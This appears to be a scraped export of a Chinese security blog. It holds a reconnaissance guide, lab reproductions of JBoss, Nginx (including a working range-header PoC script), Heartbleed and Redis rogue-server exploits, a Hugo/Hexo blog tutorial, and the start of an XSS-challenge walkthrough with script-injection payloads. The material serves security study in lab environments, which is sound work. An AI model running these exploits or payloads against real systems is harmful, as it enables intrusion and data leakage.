3.xx。这个特征就是CMS的指纹，当遇到其它网站也存在此特征时，即可快速判断CMS。\nCMS(Content Managements System):又称整站系统或文章系统。在2004年之前，若想对网站进行内容管理，基本都需要手工维护，但在信息爆炸的时代，这明显不是一种可行的方式，所以出现了CMS。客户只需安装好开发者提供的软件包，进行对应的环境配置即可定期更新数据来维护网站，节省了大量人力物力。\n常见CMS：Dedecms(织梦)、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog WordPress等。\n常用工具:御剑Web指纹识别、WhatWeb WebRobo、椰树、轻量Web指纹识别等。\n在线CMS指纹识别：\n云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)\nWhatWeb - Next generation web scanner.\n7、绕过CDN寻找真实IP CDN: 内容分发网络(Content Delivery Network)，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。简要来说，就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源(如静态HTML、CSS、JS图片等文件)直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户最近的节点服务器上响应用户请求，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站响应速度及用户体验。\n目标网站有CDN:可以直接ping目标域名，但得到的只是离我们最近的一台目标节点CDN服务器，无法获取目标真实IP。\n观察目标是否使用CDN 通过网站测速|网站速度测试|网速测试|电信|联通|网通|全国|监控|CDN|PING|DNS 17CE.COM实现全国多地ping服务器的操作，对比解析IP是否一致，若解析IP大多不一致或规律性强，则进一步查询IP归属地进行判断。\n绕过CDN寻找真实IP 内部邮箱源 一般系统邮件服务器都在内部，并不会经过CDN解析，通过目标网站用户注册或RSS订阅来查看邮件、寻找邮件头中的邮件服务域名IP，ping这个域名就能获得目标真实IP。\n 注:此方法对于第三方或公共邮件服务器无效。\n 扫描网站测试文件 如phpinfo、test等，从而找到目标真实IP。\n分站域名 一些大网站主站访问量大，所以需要挂CDN，但分站就不一样了。我们可以通过ping二级域名获取分站IP，存在主站和分站不是一个IP，但属于一个C段的可能。\n国外访问 国内CDN往往只针对国内用户访问加速，国外CDN则不一定。通过国外在线代理网站访问就有可能获得真实IP。\n其它方式 查询域名解析记录:如果目标很久未使用CDN，可以通过Netcraft | Internet Research, Cybercrime Disruption and PCI Security Services观察域名IP的历史记录，也能够大致分析出目标C段。\nAPP：如果目标有自己的APP，可以尝试用Fiddler或bp抓包找真实IP。\n绕过Cloud Flare CDN：通过https://simcast.com/查询目标真实IP。\n验证IP 最简单的方式就是直接访问。\n在目标C段较大的情况下，尝试使用Masscan工具批量扫描对应IP段中所有打开对应端口的IP，逐个访问验证。\n8、收集敏感目录文件 概念：探测Web目录结构及隐藏敏感文件是渗透测试不可缺少的环节，我们可以从中获取网站后台管理页面、文件上传页面甚至部分源码。\n常用工具：\n御剑后台扫描珍藏版\nDirBuster\n同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具 (webscan.cc)\n9、社会工程学 应用场景：通过钓鱼、查水表等方式获取信息。\n 本文链接：信息收集 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","summary":"信息收集概念 进行渗透测试之前，最重要的一步就是信息收集。\n信息收集的主要内容:收集服务器配置信息、网站敏感信息等，包括域名、子域名信息、目标网站系统CMS指纹、目标网站真实IP、开放端口等。\n1、收集域名信息 知道目标域名后，第一件事就是获取域名注册信息，包括域名DNS服务器信息及注册人联系信息等。\nWhois命令查询 概念:Whois是一个标准互联网协议，可用于收集网络注册信息，如注册域名、IP等。\n原理:Whois就是一个用于查询域名是否被注册及注册域名详细信息的数据库。\n作用:获得注册人姓名和邮箱，通过社工进一步获取其它信息。\n用法：\nwhois baidu.com\t在线Whois查询网站：\n站长工具_whois查询工具_爱站网 (aizhan.com)\n域名Whois查询 - 站长之家 (chinaz.com)\nVirusTotal\n2、查询备案信息 概念:网站备案是工具国家法律法规规定，需要网站所有者向国家有关部门申请的备案。这是国家信息产业部对网站的一种管理。\n注意:若网站搭建在其他国家，则不需进行备案。\n在线备案信息查询网站：\n天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)\n3、收集敏感信息 搜索关键字 通过搜索引擎构造特殊关键字语法来搜索互联网上的相关敏感信息。还可用其来收集数据库文件、SQL注入、配置信息、源码泄露、未授权访问和robots.txt等敏感信息。\n常用搜索语法(各搜索引擎大同小异)：\n   语法 作用     Site 指定域名   Inurl URL存在关键字的网页   Intext 网页正文中的关键字   Filetype 指定文件类型   Intitle 网页标题中的关键字   link link:baidu.com 表示返回所有和baidu.com做了链接的URL   Info 查找指定站点的基本信息   cache 搜索Google中关于某些内容的缓存    一般可以把语法结合使用以获得更准确的信息。","title":"信息收集"},{"content":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。\n影响版本 JBoss AS 4.x及之前。\n复现思路 漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具：joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)\ngit clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://\u0026lt;ip\u0026gt;:8080 成功利用漏洞执行命令。\n 本文链接：JBoss漏洞复现 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。\n影响版本 JBoss AS 4.x及之前。\n复现思路 漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具：joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)\ngit clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://\u0026lt;ip\u0026gt;:8080 成功利用漏洞执行命令。\n 本文链接：JBoss漏洞复现 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"JBoss漏洞复现"},{"content":"Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。\n如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。\n影响版本 Nginx 0.5.6 ~ 1.13.2\n复现思路 漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://\u0026lt;ip\u0026gt;:8080正常即可。\nPOC已经在当前目录中给出来，文件名poc.py：\n#!/usr/bin/env python import sys import requests if len(sys.argv) \u0026lt; 2: print(\u0026#34;%surl\u0026#34; % (sys.argv[0])) print(\u0026#34;eg: python %shttp://your-ip:8080/\u0026#34; % (sys.argv[0])) sys.exit() headers = { \u0026#39;User-Agent\u0026#39;: \u0026#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\u0026#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[\u0026#39;Range\u0026#39;] = \u0026#34;bytes=-%d,-%d\u0026#34; % ( n, 0x8000000000000000 - n) r = requests.get(url, headers=headers) 使用POC进行验证：\npython3 poc.py http://\u0026lt;ip\u0026gt;:8080/ # 获取到的文件头及返回包头 --00000000000000000019 Content-Type: text/html; charset=utf-8 Content-Range: bytes -605-611/612 ’‰Ô`b`RY:‡Ô`r«\\me\u0026#34;59526062-264\u0026#34; KEY: http://127.0.0.1:8081/  本文链接：Nginx漏洞复现 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。\n如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。\n影响版本 Nginx 0.5.6 ~ 1.13.2\n复现思路 漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://\u0026lt;ip\u0026gt;:8080正常即可。\nPOC已经在当前目录中给出来，文件名poc.py：\n#!/usr/bin/env python import sys import requests if len(sys.argv) \u0026lt; 2: print(\u0026#34;%surl\u0026#34; % (sys.argv[0])) print(\u0026#34;eg: python %shttp://your-ip:8080/\u0026#34; % (sys.argv[0])) sys.exit() headers = { \u0026#39;User-Agent\u0026#39;: \u0026#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\u0026#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[\u0026#39;Range\u0026#39;] = \u0026#34;bytes=-%d,-%d\u0026#34; % ( n, 0x8000000000000000 - n) r = requests.","title":"Nginx漏洞复现"},{"content":"OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。\n影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。\n复现思路 漏洞复现 环境搭建:\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:\nmsfconsole set RHOST \u0026lt;ip\u0026gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。\nPavel Toporkov的分享:\n15-redis-post-exploitation.pdf (zeronights.ru)\n影响版本 Redis \u0026lt;= 5.0.5\n复现思路 漏洞复现 环境搭建:\ndocker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:\nn0b0dyCN/redis-rogue-server: Redis(\u0026lt;=5.0.5) RCE (github.com)\npython3 redis-rogue-server.py --rhost \u0026lt;remote-ip\u0026gt; --lhost \u0026lt;local-ip\u0026gt; --exp=exp.so\r 本文链接：服务器应用漏洞 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/","summary":"OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。\n影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。\n复现思路 漏洞复现 环境搭建:\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:\nmsfconsole set RHOST \u0026lt;ip\u0026gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。\nPavel Toporkov的分享:\n15-redis-post-exploitation.pdf (zeronights.ru)\n影响版本 Redis \u0026lt;= 5.0.5\n复现思路 漏洞复现 环境搭建:\ndocker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:\nn0b0dyCN/redis-rogue-server: Redis(\u0026lt;=5.0.5) RCE (github.com)","title":"服务器应用漏洞"},{"content":"博客搭建 hugo Hugo官方网站：https://gohugo.io\n本文以PaperMod主题为例，官方文档：Installation · adityatelange/hugo-PaperMod Wiki (github.com)\n需求准备 Hugo：Releases · gohugoio/hugo (github.com)\n安装步骤 1.解压压缩包 2.配置环境变量 D:\\Env\\hugo_0.83.1\r3.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。\nhugo new site \u0026lt;name of site\u0026gt; -f yml\r4.指定主题 在config.yml文件中设置主题。\ntheme: PaperMod\r5.本地启动 先在本地看看网站跑起来的效果\nhugo server\r6.创建GitHub仓库 具体操作详见之后的hexo主题教学。\n7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。\nbaseURL: \u0026quot;https://\u0026lt;username\u0026gt;.github.io/\u0026quot;\r8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。\nhugo\r9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; git config --global https.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; # 更改默认分支 git push -u origin main # push文件 cd public git init git add . git remote add origin https://github.com/\u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io.git git commit -m \u0026#34;first commit\u0026#34; git push -u origin main 更新博客 # 重新生成public文件夹 hugo # 重新push到GitHub cd public/ git init git add . git commit -m \u0026#34;修改内容\u0026#34; git push -u origin main 俗话说，偷懒是第一创造力，上面的命令完全可以写一个bash脚本，这里命名为deploy.sh。\n# !/bin/bash hugo cd public git add -A \u0026amp;\u0026amp; git commit -m \u0026#34;update\u0026#34; \u0026amp;\u0026amp; git push -u origin main  写好bash脚本后，记得chmod +x deploy.sh给脚本执行权限\n 日常排错 在push的时候报错了，报错如下：\n ! [rejected] main -\u0026gt; main (fetch first)\rerror: failed to push some refs to 'https://github.com/oopsdc/oopsdc.github.io.git'\rhint: Updates were rejected because the remote contains work that you do\rhint: not have locally. This is usually caused by another repository pushing\rhint: to the same ref. You may want to first integrate the remote changes\rhint: (e.g., 'git pull ...') before pushing again.\rhint: See the 'Note about fast-forwards' in 'git push --help' for details.\r出错原因：\nGitHub中有文件不在本地代码目录中。\n解决方案：\n# 进行代码合并 git pull --rebase origin main 常用命令 生成文章 hugo new --kind post \u0026lt;name\u0026gt; hexo 需求准备  git：https://git-scm.com/ node.js：http://nodejs.cn/  git --version # 检测git是否安装成功 node -v # 检测nodejs是否安装成功 连接GitHub  为方便后续操作，之后的命令使用gitbash\n 代理设置 方法一：通过命令写配置，具体端口可查看代理软件，默认情况v2ray为10808，clash为7890:\ngit config --global http.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; git config --global https.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; 方法二：直接更改gitconfig文件：\nvim ~/.gitconfig [http] proxy = socks5://127.0.0.1:7890 [https] proxy = socks5://127.0.0.1:7890 配置个人信息 git config --global user.name \u0026#34;\u0026lt;username\u0026gt;\u0026#34; git config --global user.email \u0026#34;\u0026lt;email\u0026gt;\u0026#34; 生成SSH ssh-keygen -t rsa -C \u0026#34;\u0026lt;email\u0026gt;\u0026#34; # 后续选项默认回车 该命令会在用户文件夹下的.ssh文件夹生成id_rsa和id_rsa.pub文件，前者为私钥，后者为公钥。接下来我们把公钥提交到GitHub。\ncat ~/.ssh/id_rsa.pub # 查看公钥 登录GitHub：\n取一个合适的名称，将cat命令查看到的内容粘贴进去。\n完成上述步骤后我们检查一下连接是否成功：\nssh -T git@github.com # 出现后续的提示即为连接成功 # Hi oopsdc! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. 创建博客仓库 博客部署 安装hexo npm i hexo-cli -g # 全局安装 初始化博客文件夹 hexo init \u0026lt;blog-name\u0026gt; cd \u0026lt;blog-name\u0026gt; # 切换到博客根目录 npm install # 安装依赖 本地启动 hexo s # hexo server命令简写 我们可以看到博客本地部署成功，接下来就是换主题。\n本文以yun主题为例：\n项目官网：\n主页 | Hexo-Theme-Yun (yunyoujun.cn)\nGitHub项目地址：\nYunYouJun/hexo-theme-yun: ☁️ A fast \u0026amp; light \u0026amp; lovely theme for Hexo. 一个对可爱自以为是的 Hexo 主题。 (github.com)\n下载后将文件解压，将文件夹重命名为yun。\n修改博客根目录下的_config.yml文件，自定义主题，此处填写的主题名就是我们刚刚解压缩的文件夹名称。\nCtrll+F搜索theme，然后进行修改：\n完成上述步骤后，我们返回gitbash，Ctrl+C结束当前调试，重新运行本地文件。\n刷新网页后看到了这个报错，按照提示安装hexo-render-pug即可：\nnpm install hexo-render-pug 在安装过程中还有其它提醒：\n# Please, upgrade your dependencies to the actual version of core-js@3. # found 1 high serverity vulnerablity run `npm audit fix` to fix them, or `npm audit` for details 依次解决：\nnpm install --save -g core-js@^3 npm audit fix 安装后依旧报错：\nWARN No layout: index.html\r查了资料，不缺插件，文件夹也是正确的，实在不知道什么错，就在_config.yml和theme下分别把yun和yun文件夹都改为了theme-yun，然后正常运行。但是改回yun又会报错\u0026hellip;先暂时不讨论这个问题了。\n这就是博客初始页面。\n剩下的完全可以按照官方文档自己操作，自定义想要的功能。\n修改完且本地测试无误后，我们就可以正式把博客发布到GitHub上了。\n部署博客 首先还是编辑根目录下的_config.yml文件，直接翻到最后。\ndeploy: type: \u0026#39;git\u0026#39; repository: https://github.com/\u0026lt;username\u0026gt;/\u0026lt;usernmae\u0026gt;.github.io branch: main 部署博客需要使用命令hexo deploy，但需要安装对应平台的插件。\n以GitHub为例，安装如下：\nnpm install hexo-deployer-git --save 本地测试没有问题时，即可部署，部署时建议先清除以往数据并重新生成，避免未知错误。\nhexo clean \u0026amp;\u0026amp; hexo g -d\r配置域名 首先自己去买一个，然后按照对应的官方文档设置DNS等参数，然后点击博客仓库的Settings→GitHub Pages→Check it out here!，之后自定义域名即可。\nhexo常用命令 hexo clean # 清除已生成的静态站点文件 hexo generate # 生成静态站点文件，生成内容在public文件夹内 hexo g # 上一条命令的简写 hexo server # 启动本地服务器 hexo s # 上一条命令的简写 hexo deploy # 生成静态站点文件后部署网站 hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo s # 本地测试 升级hexo # 使用淘宝源的cnpm替换npm npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm install -g npm # 升级npm cnpm cache clean -f # 清除npm缓存 # 更新hexo:进入\u0026lt;blog\u0026gt;目录，执行如下命令: # 更新package.json中的hexo插件版本 cnpm install -g npm-check cnpm install -g npm-upgrade npm-check npm-upgrade # 更新npm所有插件 cnpm update # 检查hexo版本 hexo -v 创建文章\u0026amp;页面 hexo new \u0026#34;\u0026lt;post\u0026gt;\u0026#34; # 在博客根目录/source/_posts文件夹下按格式生成md文件 hexo new \u0026lt;page-name\u0026gt; # 生成对应页面，具体参考官方文档 日常排错 部署报错 问题描述：本地测试毫无问题，但是部署时反复报错，以下列出我尝试的解决方案。\n 方法一\n 删除博客根目录文件下的.deploy-git文件夹，然后重新部署。\nhexo clean \u0026amp;\u0026amp; hexo g -d  方法二\n 检查自己提交的分支是否和GitHub上的仓库分支一致。\n 方法三\n 网上能搜的我都搜了\u0026hellip;然后试了试特仑苏说的挂个代理。因为本地部署没问题，问题只可能出在网络上。\n打开gitbash设置代理:\nvim ~/.gitconfig # 修改git配置文件 # 添加代理 [http \u0026#34;http://github.com\u0026#34;] proxy = socks5://127.0.0.1:\u0026lt;port\u0026gt; [https \u0026#34;https://github.com\u0026#34;] proxy = socks5://127.0.0.1:\u0026lt;port\u0026gt; 10808端口是v2ray的默认端口，具体的可以在参数设置里面查看。\n至此，博客成功部署。\n优化访问 CDN加速 由于博客部署在GitHub，访问极不稳定，所以使用了Cloudflare的服务。\nCloudFlare：Cloudflare - The Web Performance \u0026amp; Security Company | Cloudflare\n参考资料:\n透過 Freenom 幫 Heroku 網址做 Cloudflare 的設定(Domain 買起來!!) · 小菜的 Blog (riverye.com)\nCDN加速原理 - 简书 (jianshu.com)\n构建Gitee图床 用Typora写博客需要图床，图片放在GitHub加载太慢(最近在学校经常被墙)。\nPicGo(Windows) 需求准备：\n PicGo：Molunerfinn/PicGo: A simple \u0026amp; beautiful tool for pictures uploading built by vue-cli-electron-builder (github.com) Gitee：Dashboard - Gitee Typora：Typora — a markdown editor, markdown reader. Node.js：https://nodejs.org/  PicGo\u0026amp;Gitee配置 Gitee 我们先来创建图床仓库。\n之后我是填写了二级文件夹的，那么我们就需要创建对应文件夹。\n最后就是token申请:\nPicGoApp 一路安装即可，如需更改路径请自行选择，接下来以2.2.2版本为例。\n我们首先安装对应插件。\n安装好之后进入PicGo设置，勾选gitee选项。\n下一步进入图床设置下的gitee，我的设置如图。\nrepo\t:\t用户名/仓库名\rbranch\t:\t分支\rtoken\t:\t个人口令\rpath\t:\t仓库下的二级文件夹\rcustomPath\t:\t自定义路径\rcustomUrl\t:\t自定义URL\r接下来我们讲Typora的配置。\n 若要使用PicGo(app)，则必须设置语言为中文\n 打开Typora，进入偏好设置。\n至此，在Typora插入图片时就会自动上传到Gitee仓库图床。\nPicGoCore(推荐) 官方文档：Upload Images (typora.io)\n中文文档：配置文件 | PicGo-Core\nPicGoApp每次上传图片都需要应用程序在后台运行，因此我们再介绍一下使用无感的PicGoCore。\nTypora原生支持PicGoCore，所以我们可以直接在Typora里安装，此处是安装完成的界面。\n安装完成之后，可以点击测试上传按钮获取插件安装路径，打开cmd，切换到对应目录:\n# 注:此处需要nodejs环境 cd C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Roaming\\Typora\\picgo\\win64 .\\picgo.exe install gitee-uploader # 以下为安装smms和github插件 .\\picgo.exe install smms-user .\\picgo.exe install github-plus 安装好之后，点击打开配置文件，会发现有一些基础的配置，以下提供了三个插件的配置，按个人需求选择复制即可:\n{ \u0026#34;picBed\u0026#34;: { \u0026#34;current\u0026#34;: \u0026#34;gitee\u0026#34;, \u0026#34;uploader\u0026#34;: \u0026#34;gitee\u0026#34;, \u0026#34;gitee\u0026#34;: { \u0026#34;branch\u0026#34;: \u0026#34;master\u0026#34;, \u0026#34;customPath\u0026#34;: \u0026#34;yearMonth\u0026#34;, \u0026#34;customUrl\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;img/\u0026#34;, \u0026#34;repo\u0026#34;: \u0026#34;\u0026lt;gitee用户名/gitee仓库名\u0026gt;\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;\u0026lt;自己的token\u0026gt;\u0026#34; }, \u0026#34;githubPlus\u0026#34;: { \u0026#34;branch\u0026#34;: \u0026#34;master\u0026#34;, \u0026#34;customUrl\u0026#34;: \u0026#34;https://cdn.jsdelivr.net/gh/\u0026lt;用户名\u0026gt;/\u0026lt;项目名\u0026gt;\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;img/\u0026#34;, \u0026#34;repo\u0026#34;: \u0026#34;\u0026lt;github用户名/github仓库名\u0026gt;\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;\u0026lt;自己的token\u0026gt;\u0026#34; }, \u0026#34;smms-user\u0026#34;: { \u0026#34;Authorization\u0026#34;: \u0026#34;\u0026lt;替换成自己的token\u0026gt;\u0026#34; }, \u0026#34;transformer\u0026#34;: \u0026#34;path\u0026#34; }, \u0026#34;picgoPlugins\u0026#34;: { \u0026#34;picgo-plugin-gitee-uploader\u0026#34;: true, \u0026#34;picgo-plugin-smms-user\u0026#34;: true, \u0026#34;picgo-plugin-github-plus\u0026#34;: true }, \u0026#34;picgo-plugin-gitee-uploader\u0026#34;: { \u0026#34;lastSync\u0026#34;: \u0026#34;2021-06-20 00:00:00\u0026#34; }, \u0026#34;picgo-plugin-github-plus\u0026#34;: { \u0026#34;lastSync\u0026#34;: \u0026#34;2021-06-20 00:00:00\u0026#34; } }  由于某些原因，GitHub不太稳，所以githubplus插件的customUrl使用了cdn\n 复制完成后，填写之前PicGoApp中的参数即可。\n再次点击上传测试，成功的话，我们已经能通过PicGo上传图片到Gitee对应仓库了。\nuPic(Mac) uPic\u0026amp;Gitee配置 uPic是一款Mac图床客户端，由于PicGo配置起来没有uPic简便，所以使用了uPic。\n安装uPic 方式一：\nbrew install upic 方式二：\n打开Typora的偏好设置，选择图片，文件上传选择uPic，点击下载uPic即可自动跳转到下载页面。\n方式三：\n通过GitHub下载：gee1k/uPic: 📤uPic is a native, powerful, beautiful and simple picture and file upload tool for macOS. (github.com)\n参数配置 从上到下依次为：\n用户名\t：\t即gitee用户名\r仓库名\t：\t自建一个公开仓库即可，详见PicGo配置\r分支\t：\t默认为master，没有特殊需求不用管\rtoken\t：\t详见PicGo配置\r域名\t：\t可不填\r保存位置\t：\t以截图为例，上传图片保存在我的 PicBed 仓库下的 oopsdc.tk 目录中，保存格式为文件名+年月日，可依据需求自行调整\rTypora设置如下：\n参数讲解：\n当插入图片时，上传图片\r规则针对本地文件\r插入图片时对URL进行转义\r点击测试上传即可验证。\n 本文链接：博客搭建 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","summary":"博客搭建 hugo Hugo官方网站：https://gohugo.io\n本文以PaperMod主题为例，官方文档：Installation · adityatelange/hugo-PaperMod Wiki (github.com)\n需求准备 Hugo：Releases · gohugoio/hugo (github.com)\n安装步骤 1.解压压缩包 2.配置环境变量 D:\\Env\\hugo_0.83.1\r3.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。\nhugo new site \u0026lt;name of site\u0026gt; -f yml\r4.指定主题 在config.yml文件中设置主题。\ntheme: PaperMod\r5.本地启动 先在本地看看网站跑起来的效果\nhugo server\r6.创建GitHub仓库 具体操作详见之后的hexo主题教学。\n7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。\nbaseURL: \u0026quot;https://\u0026lt;username\u0026gt;.github.io/\u0026quot;\r8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。\nhugo\r9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; git config --global https.proxy socks5://127.0.0.1:\u0026lt;port\u0026gt; # 更改默认分支 git push -u origin main # push文件 cd public git init git add .","title":"博客搭建"},{"content":"题目地址：https://xss-quiz.int21h.jp/\nStage #1  Hint: Very simple\u0026hellip;\n 直接输入测试语句：\n\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #2  Hint: Close the current tag and add SCRIPT tag\u0026hellip;\n 地址：XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)\n上测试语句：\n\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; 然后审查元素，只需要把input标签闭合就能执行我们的语句了。\n\u0026#34;\u0026gt;\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #3  Hint: The input in text box is properly escaped.\n 地址：XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)\n这个页面有两个input标签，先在搜索框输入我们的测试语句试试。\n直接把我们的语句放到\u0026lt;b\u0026gt;标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。\nStage #4  Hint: Invisible input field.\n 地址：XSS Challenges (by yamagata21) - Stage #4 (int21h.jp)\n审查元素发现有三个input标签，第三个标签的属性是hidden，把它改为text，然后把input标签闭合。\n\u0026#34;\u0026gt;\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #5  Hint: Length limited text box.\n 地址：XSS Challenges (by yamagata21) - Stage #5 